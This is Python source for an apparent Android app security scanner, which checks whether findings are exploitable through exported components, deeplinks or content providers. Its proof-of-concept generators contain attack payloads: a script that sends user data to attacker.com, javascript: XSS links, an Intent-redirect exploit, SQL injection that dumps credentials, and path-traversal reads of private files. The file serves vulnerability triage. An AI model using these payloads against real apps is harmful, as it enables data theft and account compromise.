"""
Exploitability Validator - Filters findings based on actual exploitability.

Reduces false positives by checking:
1. Is the vulnerable code reachable from an entry point?
2. Is the component exported or accessible via deeplink?
3. Is there actual data flow from attacker-controlled input to sink?
4. Are there mitigating factors (validation, encoding, etc.)?
"""

import re
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Set, Tuple
from pathlib import Path


@dataclass
class EntryPoint:
    """An entry point into the application."""
    type: str  # 'exported_activity', 'deeplink', 'broadcast', 'service', 'provider'
    component_name: str
    package: str
    deeplink_scheme: Optional[str] = None
    deeplink_host: Optional[str] = None
    deeplink_path: Optional[str] = None
    actions: List[str] = field(default_factory=list)

    def get_adb_command(self, adb_path: str = "adb") -> str:
        """Generate ADB command to reach this entry point."""
        full_component = f"{self.package}/{self.component_name}"

        if self.type == 'deeplink' and self.deeplink_scheme:
            scheme = self.deeplink_scheme
            host = self.deeplink_host or ''
            path = self.deeplink_path or ''
            return f'{adb_path} shell am start -a android.intent.action.VIEW -d "{scheme}://{host}{path}"'
        elif self.type == 'exported_activity':
            return f'{adb_path} shell am start -n {full_component}'
        elif self.type == 'broadcast':
            action = self.actions[0] if self.actions else 'android.intent.action.TEST'
            return f'{adb_path} shell am broadcast -n {full_component} -a {action}'
        elif self.type == 'service':
            return f'{adb_path} shell am startservice -n {full_component}'
        elif self.type == 'provider':
            return f'{adb_path} shell content query --uri content://{self.component_name}/'
        return f'{adb_path} shell am start -n {full_component}'


@dataclass
class ExploitabilityResult:
    """Result of exploitability analysis."""
    is_exploitable: bool
    confidence: str  # 'high', 'medium', 'low'
    entry_points: List[EntryPoint]
    attack_scenario: str
    concrete_poc: str
    mitigations_found: List[str]
    risk_factors: List[str]


class ExploitabilityValidator:
    """
    Validates whether findings are actually exploitable.
    """

    def __init__(self, manifest_data: Dict, package_name: str, sources_root: str):
        self.manifest = manifest_data
        self.package = package_name
        self.sources_root = Path(sources_root)

        # Build lookup maps
        self.exported_activities: Dict[str, Dict] = {}
        self.exported_services: Dict[str, Dict] = {}
        self.exported_receivers: Dict[str, Dict] = {}
        self.exported_providers: Dict[str, Dict] = {}
        self.deeplinks: List[Dict] = []

        self._build_component_maps()

    def _build_component_maps(self):
        """Build maps of exported components and deeplinks."""
        for activity in self.manifest.get('activities', []):
            if activity.get('exported'):
                name = activity.get('name', '')
                self.exported_activities[name] = activity
                # Check for deeplinks
                for intent_filter in activity.get('intent_filters', []):
                    for data in intent_filter.get('data', []):
                        if data.get('scheme'):
                            self.deeplinks.append({
                                'component': name,
                                'scheme': data.get('scheme'),
                                'host': data.get('host'),
                                'path': data.get('path') or data.get('pathPrefix') or data.get('pathPattern'),
                                'actions': intent_filter.get('actions', []),
                            })

        for service in self.manifest.get('services', []):
            if service.get('exported'):
                self.exported_services[service.get('name', '')] = service

        for receiver in self.manifest.get('receivers', []):
            if receiver.get('exported'):
                self.exported_receivers[receiver.get('name', '')] = receiver

        for provider in self.manifest.get('providers', []):
            if provider.get('exported'):
                self.exported_providers[provider.get('name', '')] = provider

    def get_class_from_path(self, file_path: str) -> str:
        """Extract class name from file path."""
        # Convert file path to class name
        path = Path(file_path)
        if 'sources' in path.parts:
            idx = path.parts.index('sources')
            class_parts = path.parts[idx+1:]
            class_name = '.'.join(class_parts)
            if class_name.endswith('.java'):
                class_name = class_name[:-5]
            elif class_name.endswith('.kt'):
                class_name = class_name[:-3]
            return class_name
        return path.stem

    def find_entry_points_for_class(self, class_name: str) -> List[EntryPoint]:
        """Find all entry points that can reach a given class."""
        entry_points = []

        # Check if class itself is exported
        for name, activity in self.exported_activities.items():
            if class_name in name or name.endswith(f'.{class_name}'):
                entry_points.append(EntryPoint(
                    type='exported_activity',
                    component_name=name,
                    package=self.package,
                ))

        # Check deeplinks
        for dl in self.deeplinks:
            if class_name in dl['component'] or dl['component'].endswith(f'.{class_name}'):
                entry_points.append(EntryPoint(
                    type='deeplink',
                    component_name=dl['component'],
                    package=self.package,
                    deeplink_scheme=dl['scheme'],
                    deeplink_host=dl['host'],
                    deeplink_path=dl['path'],
                    actions=dl['actions'],
                ))

        # Check providers
        for name, provider in self.exported_providers.items():
            if class_name in name:
                entry_points.append(EntryPoint(
                    type='provider',
                    component_name=provider.get('authorities', name),
                    package=self.package,
                ))

        return entry_points

    def validate_webview_finding(self, file_path: str, finding_type: str,
                                  js_enabled: bool = False,
                                  controllable_url: bool = False) -> ExploitabilityResult:
        """Validate a WebView-related finding."""
        class_name = self.get_class_from_path(file_path)
        entry_points = self.find_entry_points_for_class(class_name)

        mitigations = []
        risk_factors = []

        # Check if there's an entry point
        if not entry_points:
            return ExploitabilityResult(
                is_exploitable=False,
                confidence='low',
                entry_points=[],
                attack_scenario="No exported entry point found for this class.",
                concrete_poc="# Component not directly reachable",
                mitigations_found=["Component not exported"],
                risk_factors=[],
            )

        # Build risk assessment
        if js_enabled:
            risk_factors.append("JavaScript enabled")
        if controllable_url:
            risk_factors.append("URL controllable from Intent/deeplink")

        # Check for URL validation in the file
        try:
            content = Path(file_path).read_text(errors='ignore')
            if re.search(r'getHost\s*\(\s*\)\s*\.equals\s*\(', content):
                mitigations.append("Host validation detected (equals)")
            if re.search(r'startsWith\s*\(\s*["\']https://', content):
                mitigations.append("HTTPS scheme validation detected")
            if re.search(r'Uri\.parse.*getScheme.*https', content, re.IGNORECASE | re.DOTALL):
                mitigations.append("Scheme validation detected")
        except:
            pass

        # Determine confidence
        if controllable_url and js_enabled and not mitigations:
            confidence = 'high'
            is_exploitable = True
        elif controllable_url or js_enabled:
            confidence = 'medium'
            is_exploitable = len(mitigations) == 0
        else:
            confidence = 'low'
            is_exploitable = False

        # Generate concrete PoC
        poc = self._generate_webview_poc(entry_points, finding_type, js_enabled, controllable_url)
        scenario = self._generate_webview_scenario(entry_points, finding_type, js_enabled, controllable_url)

        return ExploitabilityResult(
            is_exploitable=is_exploitable,
            confidence=confidence,
            entry_points=entry_points,
            attack_scenario=scenario,
            concrete_poc=poc,
            mitigations_found=mitigations,
            risk_factors=risk_factors,
        )

    def _generate_webview_poc(self, entry_points: List[EntryPoint], finding_type: str,
                              js_enabled: bool, controllable_url: bool) -> str:
        """Generate concrete WebView exploitation PoC."""
        lines = []
        pkg = self.package

        for ep in entry_points[:1]:  # Use first entry point
            if ep.type == 'deeplink':
                scheme = ep.deeplink_scheme
                host = ep.deeplink_host or ''

                lines.append(f"# CONCRETE EXPLOIT - {finding_type}")
                lines.append(f"# Target: {pkg}")
                lines.append(f"# Entry Point: {ep.component_name}")
                lines.append(f"# Method: Deep Link")
                lines.append("")

                if controllable_url and js_enabled:
                    lines.append("# Attack 1: XSS via controllable URL")
                    lines.append(f'adb shell am start -a android.intent.action.VIEW \\')
                    lines.append(f'  -d "{scheme}://{host}?url=javascript:alert(document.domain)"')
                    lines.append("")
                    lines.append("# Attack 2: Token theft via attacker page")
                    lines.append(f'adb shell am start -a android.intent.action.VIEW \\')
                    lines.append(f'  -d "{scheme}://{host}?url=https://attacker.com/steal.html"')
                    lines.append("")
                    lines.append("# steal.html content:")
                    lines.append("# <script>")
                    lines.append("#   fetch('/api/user').then(r=>r.json()).then(d=>{")
                    lines.append("#     new Image().src='https://attacker.com/log?data='+btoa(JSON.stringify(d));")
                    lines.append("#   });")
                    lines.append("# </script>")

                elif js_enabled:
                    lines.append("# Attack: JavaScript execution in WebView context")
                    lines.append(f'adb shell am start -a android.intent.action.VIEW \\')
                    lines.append(f'  -d "{scheme}://{host}/path"')
                    lines.append("")
                    lines.append("# If WebView loads attacker-controlled content:")
                    lines.append("# JS can access any exposed JavascriptInterface")

            elif ep.type == 'exported_activity':
                full_comp = f"{pkg}/{ep.component_name}"

                lines.append(f"# CONCRETE EXPLOIT - {finding_type}")
                lines.append(f"# Target: {pkg}")
                lines.append(f"# Entry Point: {ep.component_name}")
                lines.append(f"# Method: Exported Activity")
                lines.append("")

                if controllable_url:
                    lines.append("# Attack 1: XSS via Intent extra")
                    lines.append(f'adb shell am start -n {full_comp} \\')
                    lines.append(f'  --es "url" "javascript:alert(document.cookie)"')
                    lines.append("")
                    lines.append("# Attack 2: Phishing via attacker URL")
                    lines.append(f'adb shell am start -n {full_comp} \\')
                    lines.append(f'  --es "url" "https://attacker.com/fake-login.html"')
                else:
                    lines.append("# Verify activity is reachable:")
                    lines.append(f'adb shell am start -n {full_comp}')

        return '\n'.join(lines)

    def _generate_webview_scenario(self, entry_points: List[EntryPoint], finding_type: str,
                                   js_enabled: bool, controllable_url: bool) -> str:
        """Generate human-readable attack scenario."""
        if not entry_points:
            return "No direct attack path - component not exported."

        ep = entry_points[0]

        if ep.type == 'deeplink':
            if controllable_url and js_enabled:
                return (f"1. Attacker crafts malicious link: {ep.deeplink_scheme}://{ep.deeplink_host or 'host'}?url=javascript:...\n"
                       f"2. Victim clicks link (via SMS, email, QR code, malicious app)\n"
                       f"3. App opens and loads attacker URL in WebView\n"
                       f"4. JavaScript executes with app's WebView context and permissions\n"
                       f"5. Attacker steals tokens, session data, or performs actions as user")
            elif js_enabled:
                return (f"1. Attacker hosts malicious HTML page\n"
                       f"2. If app loads attacker content in WebView, JS executes\n"
                       f"3. Any exposed @JavascriptInterface methods become callable")

        elif ep.type == 'exported_activity':
            if controllable_url:
                return (f"1. Malicious app on device calls: startActivity(new Intent().setComponent(\"{self.package}/{ep.component_name}\").putExtra(\"url\", \"javascript:...\"))\n"
                       f"2. Victim app loads attacker URL in WebView\n"
                       f"3. JavaScript executes, stealing data or performing actions")

        return f"Component {ep.component_name} is exported and accessible via {ep.type}."

    def validate_intent_finding(self, file_path: str, finding_type: str,
                                 extra_name: str = None) -> ExploitabilityResult:
        """Validate an Intent-related finding."""
        class_name = self.get_class_from_path(file_path)
        entry_points = self.find_entry_points_for_class(class_name)

        if not entry_points:
            return ExploitabilityResult(
                is_exploitable=False,
                confidence='low',
                entry_points=[],
                attack_scenario="Component not exported - Intent data not attacker-controllable.",
                concrete_poc="# Not exploitable - component not reachable",
                mitigations_found=["Component not exported"],
                risk_factors=[],
            )

        # Generate PoC for intent redirect
        poc = self._generate_intent_poc(entry_points, finding_type, extra_name)
        scenario = self._generate_intent_scenario(entry_points, finding_type, extra_name)

        return ExploitabilityResult(
            is_exploitable=True,
            confidence='high' if entry_points else 'low',
            entry_points=entry_points,
            attack_scenario=scenario,
            concrete_poc=poc,
            mitigations_found=[],
            risk_factors=[f"Intent extra '{extra_name}' flows to dangerous operation"] if extra_name else [],
        )

    def _generate_intent_poc(self, entry_points: List[EntryPoint], finding_type: str,
                             extra_name: str = None) -> str:
        """Generate concrete Intent exploitation PoC."""
        lines = []
        pkg = self.package

        for ep in entry_points[:1]:
            full_comp = f"{pkg}/{ep.component_name}"

            lines.append(f"# CONCRETE EXPLOIT - Intent Redirect")
            lines.append(f"# Target: {pkg}")
            lines.append(f"# Vulnerable Component: {ep.component_name}")
            lines.append("")

            if 'redirect' in finding_type.lower():
                lines.append("# Create exploit app with this code:")
                lines.append("# ============================================")
                lines.append("Intent outer = new Intent();")
                lines.append(f'outer.setComponent(new ComponentName("{pkg}", "{ep.component_name}"));')
                lines.append("")
                lines.append("// Inner intent targets non-exported activity")
                lines.append("Intent inner = new Intent();")
                lines.append(f'inner.setComponent(new ComponentName("{pkg}", "{pkg}.InternalActivity"));')
                lines.append('inner.putExtra("admin", true);')
                lines.append("")
                lines.append(f'outer.putExtra("{extra_name or "next_intent"}", inner);')
                lines.append("startActivity(outer);")
                lines.append("# ============================================")
                lines.append("")
                lines.append("# Or via ADB (limited - can't embed Parcelable):")
                lines.append(f'adb shell am start -n {full_comp}')

            elif ep.type == 'deeplink':
                scheme = ep.deeplink_scheme
                host = ep.deeplink_host or ''
                lines.append(f'adb shell am start -a android.intent.action.VIEW \\')
                lines.append(f'  -d "{scheme}://{host}?{extra_name or "data"}=PAYLOAD"')

        return '\n'.join(lines)

    def _generate_intent_scenario(self, entry_points: List[EntryPoint], finding_type: str,
                                  extra_name: str = None) -> str:
        """Generate human-readable Intent attack scenario."""
        if not entry_points:
            return "No attack path - component not exported."

        ep = entry_points[0]
        extra = extra_name or 'intent'

        return (f"1. Attacker creates malicious app that sends Intent to {ep.component_name}\n"
               f"2. Outer Intent contains nested Intent in extra '{extra}'\n"
               f"3. Vulnerable app extracts nested Intent and calls startActivity()\n"
               f"4. Attacker gains access to non-exported activities\n"
               f"5. Can bypass authentication, access admin features, or steal data via URI permissions")

    def validate_provider_finding(self, file_path: str, finding_type: str,
                                   authority: str = None) -> ExploitabilityResult:
        """Validate a ContentProvider finding."""
        # Check if provider is exported
        provider_exported = False
        provider_authority = authority

        for name, prov in self.exported_providers.items():
            if authority and prov.get('authorities') == authority:
                provider_exported = True
                break
            # Check by class name
            class_name = self.get_class_from_path(file_path)
            if class_name in name:
                provider_exported = True
                provider_authority = prov.get('authorities', name)
                break

        if not provider_exported:
            return ExploitabilityResult(
                is_exploitable=False,
                confidence='low',
                entry_points=[],
                attack_scenario="ContentProvider not exported or protected by permission.",
                concrete_poc="# Not exploitable - provider not accessible",
                mitigations_found=["Provider not exported or requires permission"],
                risk_factors=[],
            )

        poc = self._generate_provider_poc(provider_authority, finding_type)
        scenario = self._generate_provider_scenario(provider_authority, finding_type)

        return ExploitabilityResult(
            is_exploitable=True,
            confidence='high',
            entry_points=[EntryPoint(type='provider', component_name=provider_authority or '', package=self.package)],
            attack_scenario=scenario,
            concrete_poc=poc,
            mitigations_found=[],
            risk_factors=[f"Provider {provider_authority} is exported without permission"],
        )

    def _generate_provider_poc(self, authority: str, finding_type: str) -> str:
        """Generate ContentProvider exploitation PoC."""
        lines = []

        lines.append(f"# CONCRETE EXPLOIT - ContentProvider {finding_type}")
        lines.append(f"# Authority: {authority}")
        lines.append("")

        if 'sql' in finding_type.lower():
            lines.append("# SQL Injection - Extract all data")
            lines.append(f'adb shell content query --uri "content://{authority}/" \\')
            lines.append(f'  --where "1=1) UNION SELECT * FROM sqlite_master--"')
            lines.append("")
            lines.append("# Dump specific table")
            lines.append(f'adb shell content query --uri "content://{authority}/" \\')
            lines.append(f'  --where "1=2 UNION SELECT username,password,null FROM users--"')

        elif 'traversal' in finding_type.lower():
            lines.append("# Path Traversal - Read private files")
            lines.append(f'adb shell content read --uri "content://{authority}/..%2F..%2Fdatabases/app.db"')
            lines.append("")
            lines.append(f'adb shell content read --uri "content://{authority}/..%2F..%2Fshared_prefs/auth.xml"')

        else:
            lines.append("# Query provider data")
            lines.append(f'adb shell content query --uri "content://{authority}/"')

        return '\n'.join(lines)

    def _generate_provider_scenario(self, authority: str, finding_type: str) -> str:
        """Generate human-readable provider attack scenario."""
        if 'sql' in finding_type.lower():
            return (f"1. Provider content://{authority}/ is exported without permission\n"
                   f"2. Attacker crafts SQL injection in 'where' parameter\n"
                   f"3. Malicious SQL extracts data from other tables\n"
                   f"4. Attacker obtains credentials, tokens, or sensitive user data")

        elif 'traversal' in finding_type.lower():
            return (f"1. Provider content://{authority}/ is exported without permission\n"
                   f"2. URI path segment is decoded (%2F â†’ /)\n"
                   f"3. Attacker uses ..%2F to traverse to app's private directory\n"
                   f"4. Attacker reads databases, SharedPreferences, and internal files")

        return f"Provider {authority} is exported and accessible to any app."


def filter_false_positives(findings: list, validator: ExploitabilityValidator) -> list:
    """
    Filter findings to remove likely false positives and enrich with concrete attack paths.
    Strategy:
    - Keep all deep analysis findings (already validated)
    - Keep all manifest findings (always relevant)
    - For code findings: validate and enrich with concrete PoCs
    """
    filtered = []

    for finding in findings:
        # Skip if already has deep_analysis (those are higher quality)
        if finding.extra and finding.extra.get('deep_analysis'):
            filtered.append(finding)
            continue

        # Get file path and finding type
        file_path = finding.evidence.file_path if finding.evidence else None

        # Keep manifest findings (no file path or manifest path)
        if not file_path or 'Manifest' in (file_path or ''):
            filtered.append(finding)
            continue

        # Categorize and validate
        title_lower = finding.title.lower()
        fid_lower = finding.fid.lower()

        # WebView findings - validate and enrich
        if 'webview' in title_lower or 'webview' in fid_lower:
            js_enabled = 'javascript' in title_lower
            controllable = 'controllable' in title_lower or 'inject' in title_lower or 'url' in title_lower

            result = validator.validate_webview_finding(
                file_path, finding.title, js_enabled, controllable
            )

            if result.entry_points:
                # Enrich finding with concrete PoC
                finding.attack_path = result.attack_scenario
                finding.adb_commands = [result.concrete_poc]
                finding.extra = finding.extra or {}
                finding.extra['entry_points'] = [ep.component_name for ep in result.entry_points]
                finding.extra['confidence'] = result.confidence
                finding.extra['exploitable'] = result.is_exploitable
                if result.mitigations_found:
                    finding.extra['mitigations'] = result.mitigations_found
            filtered.append(finding)

        # Intent findings - validate and enrich
        elif 'intent' in title_lower:
            result = validator.validate_intent_finding(file_path, finding.title)

            if result.entry_points:
                finding.attack_path = result.attack_scenario
                finding.adb_commands = [result.concrete_poc]
                finding.extra = finding.extra or {}
                finding.extra['entry_points'] = [ep.component_name for ep in result.entry_points]
                finding.extra['exploitable'] = result.is_exploitable
            filtered.append(finding)

        # Provider findings - validate and enrich
        elif 'provider' in title_lower or 'contentprovider' in fid_lower:
            result = validator.validate_provider_finding(file_path, finding.title)

            if result.entry_points:
                finding.attack_path = result.attack_scenario
                finding.adb_commands = [result.concrete_poc]
                finding.extra = finding.extra or {}
                finding.extra['exploitable'] = result.is_exploitable
            filtered.append(finding)

        # Critical/High findings - always keep, enrich if possible
        elif finding.severity in ('Critical', 'High'):
            class_name = validator.get_class_from_path(file_path)
            entry_points = validator.find_entry_points_for_class(class_name)
            if entry_points:
                finding.extra = finding.extra or {}
                finding.extra['entry_points'] = [ep.component_name for ep in entry_points]
                finding.extra['exploitable'] = True

                # Generate generic PoC for the entry point
                ep = entry_points[0]
                finding.adb_commands = [ep.get_adb_command()]
            filtered.append(finding)

        # Medium findings - keep if in exported component
        elif finding.severity == 'Medium':
            class_name = validator.get_class_from_path(file_path)
            entry_points = validator.find_entry_points_for_class(class_name)
            if entry_points:
                finding.extra = finding.extra or {}
                finding.extra['entry_points'] = [ep.component_name for ep in entry_points]
                filtered.append(finding)
            # Skip medium findings not in exported components (likely false positive)

        # Low/Info - skip unless specifically interesting
        else:
            # Skip low-severity findings in non-exported components
            pass

    return filtered
